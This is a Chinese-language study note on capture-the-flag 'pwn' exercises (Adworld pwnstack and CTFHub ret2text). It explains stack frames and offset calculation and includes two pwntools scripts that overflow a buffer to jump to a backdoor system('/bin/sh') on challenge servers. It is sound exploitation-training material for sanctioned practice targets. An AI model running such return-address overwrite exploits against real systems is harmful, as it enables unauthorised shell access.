

[TOC]



# pwn练习题

## 栈溢出之 ret2text / ret2win

###  pwnstack 攻防世界

解题步骤

1.检查程序安全机制

```shell
checksec pwn2
```

2.IDA逆向分析

3.找到后门函数的开始地址

4.编写exp

```python
from pwn import *
p=remote("61.147.171.105",59432)
payload=b'a'*0xa8+p64(0x400762)
//b:表示'a'*0xa8是字节串
//p64():把 64-bit 整数变成 8 个字节的 bytes
//0xa8:观察到char buf[160];之后再加上保存的 RBP（8 字节），总偏移为 160 + 8 = 168（0xa8）
p.sendline(payload)
p.interactive()
```

5.ls查看文件，然后发现有一个叫flag的文件，cat查看文件，得到flag

### ret2text CTFHub技能树

跳过保护调查和逆向过程。

​																							————前置知识————

EBP：基址指针寄存器，指向栈底。32位环境：EBP;64位环境：RBP

栈顶：SP。

栈帧：程序运行时在栈上分配的一块内存区域。包含了函数调用时的各种状态信息。

> 栈帧的结构通常包括以下几个部分：
>
> 局部变量区：存放函数内部定义的局部变量。
> 参数区：存放函数调用时传递的参数值。
> 返回地址：存放函数执行完毕后，程序需要返回到的地址。
> 寄存器保存区：存放函数执行过程中需要暂时保存的寄存器值。

汇编语言的lea指令：用于加载有效指令到寄存器，类似于c语言中的**&**符号，可以获取数据的地址而不是数据本身。

```
; 将地址表达式的值放入EAX寄存器
lea eax, [addr]

; 将EBX寄存器的值赋给EAX
lea eax, dword ptr [ebx]

; 将变量c的地址赋给EAX
lea eax, c
```

和MOV的区别：MOV是对值操作，而lea对地址操作

![image-20250913162111216](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20250913162111216.png)

发现main函数中存在无限制的gets函数，存在栈溢出。

猜测main函数的栈帧结构：

局部变量s，用户由gets()输入，只要达到特定长度，就可以覆盖掉栈帧中的返回地址。

接下来发现secure函数![image-20250913163542746](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20250913163542746.png)

由于函数中调用了`system ("/bin/sh")` 猜测获取flag是通过执行system得到shell，然后再执行命令。

我们覆盖掉栈帧的返回地址之后，让返回地址指向`system ("/bin/sh")`所在语句对应的内存地址就能获得shell

故我们有两个关键值需要获得：

1.特定长度L，覆盖掉EBP 

2.`system ("/bin/sh")`所在语句对应的内存地址

![image-20250913164508370](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20250913164508370.png)

在main函数的汇编语言界面，由 sub rsp,70h(h:十六进制)  且在64位系统中，故要覆盖掉ebp，就要再加8字节。L=0x70+8=0x78

![image-20250913165132783](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20250913165132783.png)

接下来看secure函数的汇编语言界面，看注释得到地址为0x4007b8

得到这两个变量之后，开始着手编写exp脚本

```python
from pwn import *
host = 'challenge-271840472e9d9a32.sandbox.ctfhub.com'
port = 37614
p=connect(host,port)
payload=b'A'*0x78+p64(0x4007b8)//在pwn中，recv和send、sendline都是使用的byte型 b:告诉python这个字符串是以字节序列的形式表示的，而不是普通字符串。 p64：用于将整数打包成64位的字节序列。
p.sendline(payload)
p.interactive()
```

之后ls，cat得到flag